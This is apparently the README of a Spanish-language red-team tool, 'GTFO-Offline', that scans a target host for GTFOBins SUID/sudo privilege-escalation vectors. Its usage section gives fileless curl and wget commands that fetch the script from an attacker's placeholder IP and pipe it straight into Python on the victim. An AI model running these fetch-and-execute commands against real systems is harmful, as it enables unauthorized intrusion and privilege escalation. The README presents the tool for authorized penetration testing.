# 🚀 GTFO-Offline

**GTFO-Offline** es una herramienta táctica de post-explotación diseñada para Red Teamers y Pentesters. Permite consultar la base de datos completa de [GTFOBins](https://gtfobins.github.io/) de forma local y automatizada. 

Es la solución definitiva para operaciones en entornos **Air-Gapped**, auditorías con conectividad restringida o situaciones donde se requiere minimizar la huella en el sistema objetivo.

> [!IMPORTANT]
> Con un solo archivo empaquetado, puedes escanear una máquina víctima en busca de vectores de escalada de privilegios SUID/Sudo sin dejar rastro en el almacenamiento físico (ejecución en memoria).

---

## 🛠️ Preparación (Máquina de Ataque)

Sigue estos pasos en tu máquina local para garantizar que la base de datos esté sincronizada y lista para la acción.

### 🐍 1. Manejo del Entorno de Python
Se recomienda utilizar un entorno virtual para evitar conflictos con las dependencias globales del sistema.

```bash
# Crear el entorno virtual
python3 -m venv venv

# Activar el entorno
# En Linux/macOS:
source venv/bin/activate
# En Windows:
.\venv\Scripts\activate

# Instalar dependencias necesarias
pip install -r requirements.txt

🔄 2. Actualización de la Base de Datos

GTFOBins se actualiza constantemente. Corre el builder para obtener las últimas definiciones (450+ binarios):
```bash
python3 builder.py
```
📦 3. Generar el Standalone "Ninja"

Crea el ejecutable único que integra tanto la lógica de búsqueda como la base de datos embebida:
```bash
python3 pack.py
```
Esto generará el archivo gtfo_final.py, el único que necesitarás durante la auditoría.

🎯 Uso en la Máquina Víctima

Opción A: Ejecución "Ninja" (En Memoria) 🥷

Método recomendado. Sirve el script desde tu máquina y ejecútalo directamente en la RAM de la víctima sin tocar el disco duro.

   En tu máquina (Servidor):
    
 ```bash
    sudo python3 -m http.server 80
```

   En la víctima (Inyección directa):
```bash

    # Usando curl
    curl -s http://<TU_IP>/gtfo_final.py | python3 - --scan

    # Usando wget
    wget -qO- http://<TU_IP>/gtfo_final.py | python3 - --scan
```

Opción B: Ejecución Local

Si has transferido el archivo manualmente:
```bash
python3 gtfo_final.py --scan
```

Opción C: Consulta Manual

Úsalo como un diccionario interactivo para buscar métodos específicos:

```bash
python3 gtfo_final.py find sudo
python3 gtfo_final.py python suid
```

📂 Estructura del Proyecto

Archivo	Descripción
builder.py	Sincroniza y parsea los datos desde el repositorio oficial de GTFOBins.
gtfo_db.json	Base de datos local optimizada en formato JSON.
pack.py	Script empaquetador que genera el ejecutable independiente.
gtfo_final.py	La herramienta final. Todo en uno, lista para ser desplegada.
gtfo.py	Buscador modular original para consultas en la máquina de ataque.

⚠️ Requisitos

   Máquina de Ataque: Python 3.x, pyyaml, requests.

   Máquina Víctima: Python 3.x (Funciona con la librería estándar, sin dependencias externas).

📜 Licencia y Uso Ético

Este proyecto es de Libre Uso y Código Abierto.

   ✅ Puedes modificarlo, distribuirlo y adaptarlo a tus necesidades.

   ✅ No requiere atribución obligatoria, pero se agradece el soporte a la comunidad.

   ❌ El autor no se hace responsable del mal uso de esta herramienta.

GTFO-Offline ha sido desarrollado exclusivamente con fines educativos, de investigación y auditorías de seguridad profesional con el debido consentimiento.
